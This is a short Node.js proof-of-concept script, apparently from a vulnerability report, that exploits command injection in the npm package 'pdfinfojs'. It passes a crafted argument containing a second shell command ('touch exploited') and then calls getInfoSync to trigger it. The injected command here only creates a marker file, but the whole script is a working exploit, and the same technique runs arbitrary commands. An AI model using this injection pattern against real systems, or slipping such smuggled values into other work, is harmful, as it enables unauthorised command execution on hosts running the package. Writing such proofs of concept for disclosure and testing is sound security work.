const pkg = require("pdfinfojs");

// Setup instance attributes.
const payload = '"; touch exploited & echo "';
const options = {};
const pdfinfo_i = pkg(payload, options);

// Trigger exploit.
pdfinfo_i.getInfoSync();


console.log(pdfinfo_i.getInfoSync);